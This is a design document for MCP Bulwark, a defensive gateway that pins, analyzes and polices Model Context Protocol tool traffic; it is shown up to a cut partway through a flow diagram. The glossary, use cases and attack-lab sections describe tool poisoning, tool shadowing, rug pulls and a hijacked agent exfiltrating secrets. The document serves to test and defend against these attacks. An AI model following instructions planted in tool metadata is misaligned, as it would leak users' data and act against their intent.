# MCP Bulwark: Design Document

## Document control
| Field | Value |
|---|---|
| Status | **Approved on merge of design 03.** Design review 1 passed: [docs/reviews/design-review-1.md](docs/reviews/design-review-1.md). §8 is a v0.3 placeholder by design |
| Version | 0.11.1 |
| Last updated | 2026-11-26 |
| Idea brief | [IDEA.md](IDEA.md) |
| Reviewers | Staff security engineer, SRE, ML engineer (roles) |

### Change history
| Version | Date | Summary |
|---|---|---|
| 0.1 | 2026-11-25 | Initial skeleton with seeded architecture, flows, and threat model starters |
| 0.2 | 2026-11-26 | Lab-first roadmap: attack lab and baseline benchmark moved to M1; added FR-017/FR-018; spec backlog renumbered |
| 0.3 | 2026-11-26 | Moved to standalone repository; renamed to MCP Bulwark (CLI `bulwark`); decision 1 recorded as ADR-0001 |
| 0.4 | 2026-11-26 | (Superseded before merge) Evaluation-first draft with live-model benchmark |
| 0.5 | 2026-11-26 | Gateway with deterministic attack suite (ADR-0002, amends ADR-0001). Drafted §1–§3; renumbered FR/NFR; stdio-only v0.1; $0 and no-manual-testing constraints; updated §10, §12, §14, §15 |
| 0.6 | 2026-11-26 | Design 02: §4 architecture (v0.1 stdio, attack suite components, verify-before-call), §7 threat model (STRIDE, mitigations mapping, accepted risks); ADR-0003 Go, ADR-0004 OPA; MCP baseline 2026-07-28; FR-028…032, NFR-013…015; file-based sink |
| 0.7 | 2026-11-26 | Review fixes B1/B2: protocol handling rewritten for 2026-07-28 (no `initialize`, per-request `_meta`, `server/discover`, MRTR, `subscriptions/listen`) with 2025-11-25 compatibility; model-visible channel inventory (§4.5); whole-object tool fingerprints; FR-033…036; T-16…T-18; AR-8, AR-9; scenarios L-07, L-08 |
| 0.8 | 2026-11-26 | Review fixes S1–S10: verify-before-call re-scoped (stale-only); policies bound to server identity and declared argument roles; `ask` = deny in v0.1 (no terminal prompt); per-control attribution in the suite; FR-032 → FR-008; NFR-003/004/010/014 made automatable and non-flaky; OWASP/ATLAS mappings corrected; CI budget; specs merged 10 → 8 with a cut line (§12.1); lossless re-serialization; T-19, AR-10, AR-11; decisions 18–24 |
| 0.9 | 2026-11-26 | §1.3 `VERIFY:` items (a)–(e) resolved against the official 2026-07-28 changelog, schema, and stdio, MRTR, and `server/discover` pages (spec repository); SEP citation corrected; stdio rule "server MUST NOT write requests" and MRTR method scope added to FR-035, FR-036, and T-17; tool-change notification wording made exact |
| 0.10 | 2026-11-26 | Design 03: §5 detailed design, §6 interfaces (CLI, config, pin store, audit record, error responses, manifest), §9 operations, §10 CI workflows, §11 packaging and release; every remaining `VERIFY:` resolved against primary sources; repo made public (C-4, decisions 21 and 30); decisions 25–34; design review 1 |
| 0.11 | 2026-11-26 | Independent review of design 03: B1 fixed by the policy model "allow by pin, restrict with deny" (decision 35); MRTR checks on all three methods (S1, decision 36); JSON Pointer locations everywhere (S2); secret and MRTR blocks enforced by the gateway, independent of policy (S3); replay client wording (S4); re-check rate limit (S5, decision 37); requirement-to-test check (S6); nits N1–N5 |
| 0.11.1 | 2026-11-26 | Re-check nits: example restrictions keyed on server and declared argument role instead of tool name, plus a `roles-reviewed` rule so later-approved tools can't bypass them; `egress_url` row wording. Example policy run under OPA 1.22.4 with 8 unit tests; this found that inline `not x in {...}` did not fail closed, so checks now use named helper rules |

> **How to use this document:** follow [docs/WORKFLOW.md](docs/WORKFLOW.md) Stage 1. Each section lists **Questions to resolve**. Work through them with Claude one section at a time, replace the seeded material with agreed content, and log decisions in §14.

---

## 1. Context and scope ✅

### 1.1 Background
The **Model Context Protocol (MCP)** is a JSON-RPC 2.0 protocol. Through it, an **MCP client** (inside an agent host such as an IDE, desktop assistant, or custom agent) discovers and invokes **tools**, **resources**, and **prompts** exposed by **MCP servers**. Servers run locally over **stdio** (as a subprocess) or remotely over **Streamable HTTP**. Everything a server says about its tools reaches the model's context, which makes the client–server boundary a security boundary that is rarely enforced.

MCP Bulwark is an **MCP-aware intermediary**. It acts as a server to the client and as a client to the upstream server, so it can inspect and control every message. It ships with an **attack suite** that proves each protection ([ADR-0002](docs/adr/0002-gateway-with-attack-suite.md)):

```mermaid
flowchart LR
  subgraph Suite["Attack suite (runs in CI)"]
    RC["Replay client<br/>(scripted hijacked agent)"]
    AS["Assertions + results table"]
    K[("Observation log<br/>(file)")]
  end
  subgraph Mode["Condition"]
    D["none (direct) · bulwark (warn) · bulwark (enforce)"]
  end
  subgraph Lab["lab/ (LAB ONLY)"]
    L["Malicious-but-harmless<br/>MCP servers L-01…L-08"]
  end
  RC <-->|"MCP over stdio"| D <-->|"MCP over stdio"| L
  L -. "exfiltration attempts" .-> K
  K --> AS
  RC --> AS
```

**Why no AI model is needed:** Bulwark never relies on the model behaving well. It inspects the server-supplied content that reaches the model, to the extent listed per channel in §4.5 (some channels are only analyzed and audited in v0.1), and it controls which calls get through. A scripted client that sends exactly what a hijacked agent would send tests those controls deterministically. How often real models get hijacked is covered by published research (for example MCPTox), which the docs cite.

### 1.2 Scope

| Area | In scope for v0.1 | Deferred |
|---|---|---|
| Transport | stdio | Streamable HTTP (v0.2) |
| Servers per gateway | One upstream server per gateway process | Multi-server aggregation with namespacing (v0.2) |
| Protocol revisions | **2026-07-28** (primary) and **2025-11-25** (compatibility); others rejected in `enforce` (FR-036) | Newer revisions as they ship |
| MCP features enforced | `tools/list`, `tools/call` (including MRTR retries), server metadata from `server/discover` or `initialize` (FR-033), tool-change notifications | Pinning and blocking for prompts and resources (v0.2) |
| MCP features analyzed and audited, not blocked | Prompts and resources (list metadata and contents), MRTR input requests (FR-034) | Policy enforcement (v0.2) |
| Server-initiated requests (2025-11-25 only: sampling, elicitation, roots) | **Passed through and audited, not enforced** | Policy enforcement (v0.2+); deprecated or replaced by MRTR in 2026-07-28 |
| Testing | Deterministic replay scenarios + detection corpora, all in CI | Optional "bring your own model" live mode (later) |
| Session-level defenses | Per-call policy only | Taint tracking (v0.2) |

### 1.3 Target protocol revision
v0.1 targets MCP specification revision **2026-07-28**, the latest at the time of drafting, supported by the official Go SDK v1.7.0 (ADR-0003). It also supports **2025-11-25** for compatibility, because clients and servers in the field will speak it for some time. Bulwark is **revision-aware but not a translator**: it forwards each message in the revision the sender used and applies the same controls in both.

What changed in 2026-07-28 that matters to Bulwark. Source: the official changelog, `schema.ts`, and the stdio transport, MRTR, and `server/discover` pages for revision 2026-07-28 in the specification repository (github.com/modelcontextprotocol/modelcontextprotocol, `main`, read 2026-11-26).

| Area | 2025-11-25 | 2026-07-28 | Bulwark impact |
|---|---|---|---|
| Handshake | `initialize` / `initialized`; version negotiated once | Handshake **removed** (SEP-2575). Each request carries `io.modelcontextprotocol/protocolVersion` and `io.modelcontextprotocol/clientCapabilities` in `_meta`, and SHOULD carry `io.modelcontextprotocol/clientInfo`. A version mismatch returns `UnsupportedProtocolVersionError` (code -32022). (SEP-2567 is the separate removal of HTTP sessions.) | The revision is determined **per message**, not per connection (FR-036) |
| Server metadata | `InitializeResult`: `serverInfo`, `capabilities`, `instructions` | `server/discover` result (`DiscoverResult`): `supportedVersions`, `capabilities`, optional `instructions`, plus required `ttlMs` and `cacheScope`. Servers SHOULD put `io.modelcontextprotocol/serverInfo` in each result's `_meta`. Servers MUST implement it; clients MAY call it first or use it as a backward-compatibility probe on stdio. `instructions` appears nowhere else in the 2026-07-28 schema | Server metadata is pinned and analyzed from either source (FR-033) |
| Server-to-client requests | `sampling/createMessage`, `elicitation/create`, `roots/list` | Replaced by **Multi Round-Trip Requests (MRTR)** (SEP-2322). On stdio the server **MUST NOT** write JSON-RPC requests to stdout. Instead it returns an `InputRequiredResult` (`resultType: "input_required"`) with an `inputRequests` map (server-assigned keys; values are `ElicitRequest`, `CreateMessageRequest`, or `ListRootsRequest`) and/or an opaque `requestState`. The client retries the original request **with a new JSON-RPC `id`**, carrying `inputResponses` under the same keys and echoing `requestState` unchanged. Only `tools/call`, `prompts/get`, and `resources/read` may return `input_required`. Roots, Sampling, and Logging are deprecated (SEP-2577), with a minimum 12-month window | MRTR input requests are analyzed and audited; the retry is a new `tools/call` through the full pipeline (FR-034, FR-035) |
| Change notifications | `notifications/tools/list_changed` | Same method name (`notifications/tools/list_changed`), but delivered **only** if the client opened `subscriptions/listen` with the `toolsListChanged` filter; tagged with `io.modelcontextprotocol/subscriptionId` (the listen request's `id`) | Both forms invalidate Bulwark's cached tool view (§4.4). A client that never subscribes gets no notification, so Bulwark relies on `ttlMs` and max-age re-checks (FR-030) |
| List caching | — | `ttlMs` and `cacheScope` required on `server/discover`, `tools/list`, `prompts/list`, `resources/list`, `resources/read`, and `resources/templates/list` (SEP-2549) | Recorded; used by the pin re-check schedule (design 03) |
| Removed methods | `ping`, `logging/setLevel`, `notifications/roots/list_changed` | Removed. Log level is set per request with `io.modelcontextprotocol/logLevel` in `_meta`; servers MUST NOT send `notifications/message` for requests without it (SEP-2575) | Under 2026-07-28 these methods are unknown and handled like any unknown method |

**Stdio framing is unchanged in 2026-07-28:** one newline-delimited JSON-RPC message per line, no embedded newlines; nothing but valid MCP messages on stdout; stderr is free-form logging. On stdio, all messages share one channel: responses (correlated by `id`), notifications tied to an in-flight request (`notifications/progress`, `notifications/message`), and notifications for an active `subscriptions/listen` (correlated by `io.modelcontextprotocol/subscriptionId`). A dual-revision client SHOULD probe with `server/discover` first and fall back to `initialize` only on a non-modern error or a timeout. Compatibility testing needs no SDK version pin: the replay client sends raw JSON-RPC (§5.9), and a Go SDK v1.7.0 server answers a legacy `initialize` at the client's version when it is supported and older than 2026-07-28 (`negotiatedVersion`, `mcp/shared.go` at tag v1.7.0).

### 1.4 Glossary
| Term | Definition |
|---|---|
| Tool definition | The **entire tool object** as returned by `tools/list` (for example `name`, `title`, `description`, `inputSchema`, `outputSchema`, `annotations`, `icons`, `_meta`, and any field a later revision adds) |
| Server metadata | `instructions`, server info (name, title, version, and other descriptive fields), and capabilities, from `server/discover` (2026-07-28) or `initialize` (2025-11-25) |
| Fingerprint | SHA-256 over the canonicalized (RFC 8785 JCS) tool definition or server metadata. Every field counts unless named in an explicit, audited exclude list (empty by default), so unknown fields cannot slip past pinning |
| Model-visible channel | Any server-supplied content that can reach the model or the user, such as tool definitions, server instructions, prompts, resources, results, and MRTR input requests (§4.5) |
| MRTR | Multi Round-Trip Requests (2026-07-28): a server answers a call with `resultType: "input_required"`, and the client retries the call with `inputResponses` |
| Pinning | Recording an approved fingerprint and alerting on or blocking any difference |
| Rug pull | A tool definition that changes after approval |
| Tool poisoning | Instructions aimed at the model hidden in tool metadata |
| Tool shadowing | A tool whose description manipulates how the agent uses *another* tool |
| Scenario | A lab server plus a replay script and expected outcomes per condition |
| Replay client | A scripted MCP client that sends the messages a hijacked agent would send. No AI model involved |
| Condition | How the replay client reaches the lab server: `none` (direct), `bulwark-warn`, or `bulwark-enforce` |
| Canary | A fake secret planted in the lab. If it reaches the sink, data was exfiltrated |
| Sink | The **observation log**: a local file where lab servers record tool calls and "exfiltrated" canaries. No network involved (§4.2) |
| Observables | What each scenario checks: `poison_delivered` (malicious text reached the client), `forbidden_call_executed` (the upstream server ran a call it shouldn't have), `canary_exfiltrated` (a canary reached the sink) |
| Detection corpus | A set of tool definitions (poisoned or benign) used to measure analyzer detection and false-positive rates |

---

## 2. Requirements ✅

Requirement IDs: **FR-001…FR-019 attack suite and evaluation**, **FR-020…FR-039 Gateway v0.1**, **FR-040+ later**.

### 2.1 Functional requirements

**Attack suite and evaluation**
| ID | Requirement | Priority | Source |
|---|---|---|---|
| FR-001 | The suite shall provide scenarios L-01…L-08 (§10.3) as stdio MCP servers in `lab/`. Each has a manifest declaring ID, technique, OWASP/ATLAS mapping, replay script, and expected observables per condition. | MVP | G5 |
| FR-002 | Lab servers shall use canary secrets only, record "exfiltration" only to the local observation log, and make no network connections at all. | MVP | G5 |
| FR-003 | The replay client shall execute a scenario's replay script under a given protocol revision and record every message sent and received. Steps: for 2026-07-28, optional `server/discover`, then per-request `_meta`, `tools/list`, `tools/call` with given arguments, MRTR retries with scripted `inputResponses`, and waits on `subscriptions/listen`; for 2025-11-25, `initialize`/`initialized` first and `notifications/tools/list_changed` for waits. | MVP | G5 |
| FR-004 | For each scenario, the suite shall assert the expected observables under each condition. The attack must **succeed under `none`**, proving the scenario is real; be **detected under `bulwark-warn`** (the expected finding is in the audit log); and be **blocked under `bulwark-enforce`** (no attack observable is true). The manifest names the **control(s) expected to fire** (policy or analyzer IDs), and the suite asserts from the audit log that exactly those fired. When a scenario lists several controls, it runs once per control with only that control enabled, so each control is shown to stop the attack on its own. | MVP | G5 |
| FR-005 | CI shall run the suite on every PR and publish a results table (scenario × condition) in the job summary. A failing assertion fails the build. | MVP | G5 |
| FR-006 | An analyzer corpus test shall report detection rate on poisoned tool definitions (MCPTox subset: benchmark materials licensed CC BY 4.0 at github.com/zhiqiangwang4/MCPTox-Benchmark, reused with attribution; plus the lab's own payloads) and false-positive rate on benign tool definitions from real open-source MCP servers. | MVP | G2, G5 |
| FR-007 | A one-command demo (`make demo` or a container image) shall run selected scenarios with and without Bulwark and print the results table, with no setup beyond Docker or the release binary. | MVP | G6 |
| FR-008 | The `bulwark-lab` binary shall refuse to start unless `BULWARK_LAB=1` is set, and shall print a `LAB ONLY` banner to stderr on start. | MVP | G5 (T-L2) |

**Bulwark Gateway (v0.1, stdio)**
| ID | Requirement | Priority | Source |
|---|---|---|---|
| FR-020 | Gateway shall wrap one upstream stdio server command and proxy all MCP messages between client and server transparently when no policy applies. | MVP | G1 |
| FR-021 | Gateway shall fingerprint every tool definition (the whole tool object, minus an explicit exclude list that is empty by default and recorded in the pin store) and compare it to the pin store. New or changed tools are handled by mode: `learn` (pin automatically), `warn` (forward and alert), `enforce` (hide the tool from the client until approved). | MVP | G2 |
| FR-022 | Gateway shall run static analyzers on tool definitions and record findings with severities. At minimum: hidden Unicode, model-directed instructions, cross-tool references, and side-channel schema parameters. In `enforce` mode, tools with high-severity findings are hidden until approved. | MVP | G2 |
| FR-023 | Gateway shall evaluate a policy for every `tools/call` and enforce `allow` or `deny`. In v0.1, `ask` is treated as `deny`: the error tells the agent that approval is required, and an `approval_required` audit record names the policy ID so the operator can adjust policy or approve the tool with the CLI. v0.1 shows no interactive prompts; per-call approval comes with the approval broker (FR-043). | MVP | G3 |
| FR-024 | Policies shall be able to constrain arguments: path prefixes, URL/domain allowlists, and regex patterns. Because tool names and argument meanings are chosen by the (untrusted) server, the decision input shall identify the **server** (configured server ID plus command digest) and the tool's **pin status**. Derived attributes (cleaned path, URL scheme and host) are computed only for arguments whose **role** (`fs_path`, `egress_url`, `recipient`, …) is declared in configuration; role mappings are stored with the tool's pin, and changing them is audited. | MVP | G3 |
| FR-025 | Gateway shall detect secrets (pattern based in v0.1; entropy-based detection is deferred to cut false positives and scope) in tool arguments, MRTR `inputResponses`, and results (`content`, `structuredContent`, upstream error messages, and resource contents), and redact them according to configuration. | MVP | G3 |
| FR-026 | Gateway shall write an audit record for every decision, chained with SHA-256 hashes so that any modification or deletion is detectable. | MVP | G4 |
| FR-027 | The CLI shall support: `wrap`, `tools list/diff/approve/reject`, `policy test`, and `audit verify/tail`. | MVP | G1–G4 |
| FR-028 | Gateway shall parse every message strictly: reject duplicate object keys, invalid UTF-8, `\u` escapes that encode lone UTF-16 surrogates, and messages over the size or depth limits. It shall forward the **re-serialized form it inspected**, never the original bytes. Re-serialization shall be **lossless**: numbers are kept exactly as written (never converted to floating point, so integers above 2^53 survive), and unknown fields are kept. A property test and a fuzz target check that parse → serialize → parse yields an identical message. | MVP | G2 (T-01) |
| FR-029 | Every CLI output that includes untrusted text (tool definitions, diffs, prompts, audit fields) shall neutralize control characters, ANSI escapes, and bidi controls. | MVP | G2 (T-11) |
| FR-030 | In `enforce` mode, before forwarding a `tools/call`, Gateway shall confirm the called tool's last-seen definition matches its approved pin. It shall re-fetch `tools/list` itself when its view is stale: after a tool-change notification, when the server's `ttlMs` hint has expired, or when the view is older than `pin_recheck_max_age` (default 300 s). Setting `pin_recheck_max_age: 0` and `pin_recheck_min_age: 0` re-checks before every call (opt-in). Otherwise re-checks are rate-limited by `pin_recheck_min_age` (default 30 s), so a server cannot force a re-check before every call. | MVP | G2 (M-2) |
| FR-031 | Gateway shall track outstanding request IDs (client-to-server always; server-to-client too under 2025-11-25), use a reserved ID namespace for its own requests (never forwarded), and drop and audit responses that match no outstanding request. | MVP | G2 (T-04) |
| FR-033 | Gateway shall fingerprint, pin, and analyze **server metadata** (`instructions`, server info, capabilities) from `server/discover` (2026-07-28) or `initialize` (2025-11-25). In `enforce` mode, unapproved or changed metadata, or metadata with high-severity findings, has `instructions` and other free-text descriptive fields removed before forwarding until approved (name and version are kept). | MVP | G2 (M-8, B2) |
| FR-034 | Gateway shall run the FR-022 analyzers on prompts (`prompts/list` metadata and `prompts/get` messages), resources (`resources/list` and template metadata), and MRTR input requests, and audit the findings. v0.1 does not block or pin these (AR-8). | MVP | G2 (M-8, M-9) |
| FR-035 | Gateway shall check every MRTR retry, meaning a `tools/call`, `prompts/get`, or `resources/read` carrying `inputResponses` or `requestState`. The retry has a new JSON-RPC `id` (MRTR rule), so Bulwark matches it to the earlier `input_required` result by server, method, target, and `requestState` (§5.7). `requestState` is forwarded byte-for-byte and never inspected or modified. Before policy, and independent of it, the gateway checks the retry: secrets in `inputResponses` (`secrets:<rule>`), keys the server never requested (`mrtr:unsolicited_response`), and retries with no match (`mrtr:unmatched_retry`). In `enforce` mode each of these blocks the retry. A `tools/call` retry then goes through the full `tools/call` pipeline (pin check, policy with the input responses in the decision input). | MVP | G3 (M-9, T-16) |
| FR-036 | Gateway shall determine each message's protocol revision (per request under 2026-07-28; from the negotiated version under 2025-11-25), apply the same controls under both supported revisions, and record the revision in the audit log. Messages in an unsupported or unrecognizable revision are rejected in `enforce` mode and forwarded with an audit record in `learn` and `warn` modes. Under 2026-07-28, a JSON-RPC **request** from the server on stdout, or an `input_required` result on any method other than `tools/call`, `prompts/get`, or `resources/read`, is a protocol violation: blocked in `enforce`, audited in all modes. | MVP | G2 (T-17) |

**Later (v0.2+)**
| ID | Requirement | Priority |
|---|---|---|
| FR-040 | Streamable HTTP transport | Later |
| FR-041 | Multi-server aggregation with tool namespacing | Later |
| FR-042 | Session taint tracking and taint-aware policy | Later |
| FR-043 | Out-of-band human approval broker | Later |
| FR-044 | Prompt-injection classifier tier (CPU-only, runs in CI) | Later |
| FR-045 | OpenTelemetry and OCSF audit export | Later |
| FR-046 | Optional live-model mode: run scenarios with a real agent against a user-supplied OpenAI-compatible endpoint | Later |

### 2.2 Non-functional requirements
| ID | Category | Requirement | Measure |
|---|---|---|---|
| NFR-001 | Cost | Development, CI, and demo use no paid service | Dependency and workflow review |
| NFR-002 | Automation | All verification runs in GitHub Actions. No requirement needs a manual or local test step by the maintainer. | Every NFR and FR maps to a CI job (§10) |
| NFR-003 | Lab safety | The suite passes in a container with all networking disabled except loopback. Any other connection attempt fails the run. | CI job runs the suite under `strace -f -e trace=connect` (or an equivalent syscall trace, fixed in spec 001); any `connect` to a non-loopback, non-Unix address fails the job |
| NFR-004 | Performance | Gateway pipeline adds p95 < 5 ms per message (no ML, no human approval), measured **in-process** with the upstream excluded | Go benchmark over a fixed corpus of recorded messages with a fixed iteration count; gates at 5 ms (far above the expected cost, so shared-runner noise cannot flip it). End-to-end latency, including upstream and verify-before-call round trips, is reported in the job summary but not gated |
| NFR-005 | Reliability | Gateway fails closed by default if policy evaluation errors | Fault-injection test |
| NFR-006 | Integrity | `audit verify` detects any modified, inserted, or deleted audit record | Tamper tests |
| NFR-007 | Privacy | No data leaves the host: no telemetry, no external calls by the gateway | Network test in CI |
| NFR-008 | Determinism | Suite results are identical across reruns (no flaky tests) | Each CI run executes the suite twice and compares results |
| NFR-009 | CI time | The full CI pipeline finishes in ≤ 10 minutes | CI timing |
| NFR-010 | Portability | Linux and macOS supported; Windows best-effort | Linux and macOS on every PR, in parallel (C-4) |
| NFR-011 | Usability | A reviewer goes from clone (or release download) to demo output in ≤ 10 minutes | Documented quickstart, scripted in CI |
| NFR-012 | Supply chain | Releases are built in CI with an SBOM and signatures (Sigstore) | Release workflow |
| NFR-013 | Resource limits | Configurable maximum message size (default 4 MiB), JSON nesting depth (default 64), outstanding requests, and notification rate. Exceeding a limit produces an error and an audit record, not a crash | Fuzz and limit tests in CI |
| NFR-014 | Attack surface | v0.1 Gateway opens no network listeners and makes no network connections; policies cannot either (T-19) | Network-disabled, syscall-traced CI run (as in NFR-003); a CI check that fails if Bulwark's own packages import `net` or `net/http` directly (dependencies such as OPA may link them, which is why the trace is the real check); a test that loading a policy using `http.send` fails |
| NFR-015 | Dependency hygiene | Dependencies pinned (`go.sum`); `govulncheck`, GitHub dependency review, and a repository secret scan run in CI; no known-vulnerable dependency at release | CI job (§10.2) |

### 2.3 Constraints and assumptions
| ID | Type | Statement |
|---|---|---|
| C-1 | Constraint | $0 budget (NFR-001). No paid APIs, hosted services, or paid GitHub features. |
| C-2 | Constraint | Maintainer time is 1–2 hours/week. Claude designs, builds, and tests; the maintainer reviews PRs (≤ 30 minutes each). |
| C-3 | Constraint | No manual testing or local model runs (NFR-002). |
| C-4 | Constraint | The repo is **public** (since 2026-11-26). Standard GitHub-hosted runners are free for public repositories, Linux and macOS alike, so CI has no minute budget. The remaining limit is wall time (NFR-009). *(Before v0.10 the repo was private, with a 2,000-minute monthly allowance; decision 21 is amended accordingly.)* |
| A-1 | Assumption | Protocol-level replay is a faithful test of Bulwark's controls, because Bulwark acts only on protocol messages. It does **not** show how often a model would follow the malicious instructions. The docs cite published research for that (R3 in IDEA.md). |
| A-2 | Assumption | The official Go MCP SDK (stable since v1.0.0; v1.7.0 supports revision 2026-07-28) is sufficient for the **lab servers**. The replay client sends raw scripted JSON-RPC (§5.9, decision 29), and the gateway parses JSON-RPC itself (ADR-0003). |

---

## 3. Users and use cases ✅

### 3.1 Personas
See [IDEA.md](IDEA.md#target-users). The primary persona for v0.1 is the **developer using agents**. The **portfolio reviewer** is a first-class persona: the README, demo, and design docs are written for a 10-minute evaluation.

### 3.2 Use cases
| ID | Actor | Trigger | Main flow | Outcome | Traces to |
|---|---|---|---|---|---|
| UC-01 | Portfolio reviewer | Opens the repo | Reads the README, runs `make demo` (or the container) | Sees each attack succeed without Bulwark and get blocked with it, in one table | FR-007, NFR-011 |
| UC-02 | Developer | Adds a third-party stdio server | Wraps it with `bulwark wrap -- <cmd>` in `learn` mode, reviews findings, switches to `enforce` | Poisoned description flagged; tool hidden until approved | FR-020…022, FR-027 |
| UC-03 | Developer | A server silently changes a tool (rug pull) | Gateway detects a fingerprint mismatch on the next `tools/list` | Tool quarantined; `bulwark tools diff` shows the change | FR-021, FR-027 |
| UC-04 | Developer | A hijacked agent tries to send data to an unapproved domain | Policy with a domain allowlist evaluates the `tools/call` | Call denied with the policy ID; audit record written | FR-023, FR-024, FR-026 |
| UC-05 | IR analyst | Investigating an agent's actions | `bulwark audit verify`, then `audit tail` filtered by session | Integrity confirmed; session reconstructed | FR-026, FR-027 |
| UC-06 | Contributor | Wants to add an attack | Proposes a scenario through the issue template; implements it under `lab/` with a manifest | CI runs it on every PR from then on | FR-001…005 |

### 3.3 Hero demos (README and launch write-up)
1. **UC-01 "Attacks vs. Bulwark"**: one table and a terminal recording of six attacks, each succeeding directly and blocked through Bulwark.
2. **UC-03 "Rug pull caught"**: a tool changes after approval, is quarantined, and the diff is shown.

---

## 4. Architecture ✅

v0.1 architecture: one Bulwark process per wrapped stdio server, written in Go ([ADR-0003](docs/adr/0003-implementation-language.md)), with policies in OPA/Rego ([ADR-0004](docs/adr/0004-policy-engine.md)). It opens **no network listeners** and makes **no network connections** (NFR-014).

### 4.1 System context

```mermaid
flowchart LR
  subgraph Host["Agent host (TB1)"]
    C["MCP client<br/>(IDE, desktop app, agent)"]
  end
  subgraph BW["bulwark wrap -- &lt;cmd&gt; (TB2)"]
    FE["Client side<br/>stdin / stdout"]
    PL["Message pipeline<br/>parse → intercept → re-serialize"]
    BE["Upstream side<br/>child process pipes"]
  end
  subgraph Up["Upstream MCP server (untrusted, TB3)"]
    S["child process<br/>(optionally inside a container)"]
  end
  subgraph St["Local state (TB4)"]
    CF["config.yaml"]
    PN["pins.json"]
    PO["policies/*.rego"]
    AU["audit.jsonl"]
  end
  OP(["Operator"])
  C <-->|"JSON-RPC over stdio"| FE
  FE <--> PL <--> BE
  BE <-->|"stdin/stdout<br/>(stderr passed through)"| S
  PL --- CF
  PL --- PN
  PL --- PO
  PL --> AU
  OP -->|"bulwark tools / audit / policy<br/>(separate CLI invocations)"| St
```

The MCP client launches `bulwark wrap -- <server command>` instead of the server. Bulwark starts the real server as a child process and sits on both pipes. To the client it is a server, and to the server it is a client.

### 4.2 Components

**Gateway (`bulwark`)**
| Package | Responsibility | Key requirements |
|---|---|---|
| `cmd/bulwark` | CLI entry point: `wrap`, `tools`, `policy`, `audit` | FR-027 |
| `internal/jsonrpc` | Strict framing and parsing of newline-delimited JSON-RPC: size limits, duplicate-key rejection, UTF-8 validation, canonical re-serialization | FR-028, NFR-013 |
| `internal/mcprev` | Protocol revision handling: detects each message's revision (per-request `_meta` for 2026-07-28, negotiated version for 2025-11-25), maps revision-specific shapes (handshake vs. `server/discover`, MRTR vs. server-initiated requests, change-notification forms) onto one internal model for the interceptors | FR-036 |
| `internal/proxy` | Owns both pipes and the child process lifecycle. Tracks request IDs per direction, routes messages through the pipeline, issues gateway-originated requests in a reserved ID space | FR-020, FR-030, FR-031 |
| `internal/pipeline` | Ordered interceptors keyed by (direction, method). Each returns *forward*, *modify*, or *block with error* | FR-020…025 |
| `internal/registry` | JCS canonicalization, whole-object fingerprints for tools and server metadata, pin store (JSON file), `learn`/`warn`/`enforce` modes, diffs | FR-021, FR-030, FR-033 |
| `internal/analyzers` | Analyzer interface, text normalization helpers, the first four analyzers, applied to every model-visible channel in §4.5 | FR-022, FR-033, FR-034 |
| `internal/policy` | Embedded OPA: decision-input builder (including derived attributes such as cleaned paths and URL hosts), prepared queries, decision combining | FR-023, FR-024, NFR-005 |
| `internal/redact` | Secret detectors (patterns in v0.1; entropy later) for arguments, MRTR input responses, and results | FR-025, FR-035 |
| `internal/audit` | Hash-chained JSONL writer, `verify`, `tail` | FR-026, NFR-006 |
| `internal/config` | YAML configuration with JSON Schema validation | — |
| `internal/termsafe` | Neutralizes untrusted text (control characters, ANSI escapes, bidi controls) before printing it to a terminal | FR-029 |

**Attack suite (`lab/`)**
| Package | Responsibility | Key requirements |
|---|---|---|
| `lab/cmd/bulwark-lab` | One binary containing lab servers L-01…L-08 (built on the official Go SDK). Refuses to start unless `BULWARK_LAB=1`; prints a `LAB ONLY` banner to stderr | FR-001, FR-002, FR-008 |
| `lab/scenarios/*.yaml` | Scenario manifests: technique, mappings, replay script, expected observables per condition | FR-001, FR-004 |
| `lab/replay` | Replay client: a scripted raw JSON-RPC driver (not the SDK, decision 29) that executes a replay script under a chosen protocol revision and records the transcript | FR-003 |
| `lab/suite` | Go tests: for each scenario × condition × revision, start the stack, replay, read the observation log, assert. All scenarios run under 2026-07-28; a compatibility subset (L-01, L-02, L-07) also runs under 2025-11-25 | FR-004, FR-036, NFR-008 |
| `tools/ci-summary` | Renders suite results (JSON) as a Markdown table for the GitHub Actions job summary and the README | FR-005 |

**Sink design:** lab servers never use the network. Their "exfiltration" tools append to an **observation log** file given by `BULWARK_LAB_OBS`, which the suite reads to compute observables. This is safer than a loopback listener and lets the suite run with networking fully disabled (NFR-003).

### 4.3 Repository layout (v0.1)
```
cmd/bulwark/            CLI
internal/               gateway packages (§4.2)
lab/                    LAB ONLY: attack servers, scenarios, replay client, suite
  cmd/bulwark-lab/
  scenarios/
  replay/
  suite/
testdata/corpora/       detection corpora (MCPTox subset, benign definitions)
policies/examples/      example Rego policies + their tests
tools/ci-summary/
docs/                   ADRs, workflow, write-ups
.github/workflows/      CI: test, suite, lint, vuln scan, release
```

### 4.4 Key flows

**Server metadata (`server/discover` under 2026-07-28, `initialize` under 2025-11-25)**
```mermaid
sequenceDiagram
  participant C as Client
  participant B as Bulwark
  participant U as Upstream
  C->>B: server/discover (2026-07-28) or initialize (2025-11-25)
  B->>U: forwarded (re-serialized)
  U-->>B: supportedVersions / protocolVersion, capabilities, instructions, server info
  B->>B: record revision(s), fingerprint metadata (JCS), compare with pin
  B->>B: run analyzers on instructions and descriptive fields
  B->>B: enforce + unapproved, changed, or high finding → remove instructions and free-text fields
  B->>B: audit(metadata, findings, pin status)
  B-->>C: re-serialized, possibly reduced result
```
Under 2026-07-28 a client may never call `server/discover`. Bulwark then issues its own `server/discover` (reserved ID namespace, FR-031) on the first client request, so server metadata is always pinned and audited even if it never reaches the client. This covers every route: in the 2026-07-28 schema, `instructions` appears only in `DiscoverResult`.

**Tool discovery (`tools/list`)**
```mermaid
sequenceDiagram
  participant C as Client
  participant B as Bulwark
  participant U as Upstream
  C->>B: tools/list (id 7)
  B->>U: tools/list (id 7)
  U-->>B: result: tool definitions (+ nextCursor)
  B->>B: strict parse, canonicalize (JCS), fingerprint
  B->>B: compare with pins: new / unchanged / changed
  B->>B: run analyzers, record findings
  B->>B: apply mode: learn / warn / enforce (hide unapproved tools)
  B->>B: audit(discovery, findings, pin status)
  B-->>C: re-serialized, filtered result (id 7)
```
Paginated results (`nextCursor`) are handled page by page. A tool-change notification from upstream (`notifications/tools/list_changed` in both revisions; under 2026-07-28 it arrives only on a client-opened `subscriptions/listen` stream and carries `io.modelcontextprotocol/subscriptionId`) is forwarded to the client and invalidates the gateway's cached view, so the next `tools/list` is re-checked. `ttlMs` and `cacheScope` hints are recorded in the audit log and feed the re-check schedule (§5.3).

**Tool invocation (`tools/call`)**
```mermaid
sequenceDiagram
  participant C as Client
  participant B as Bulwark
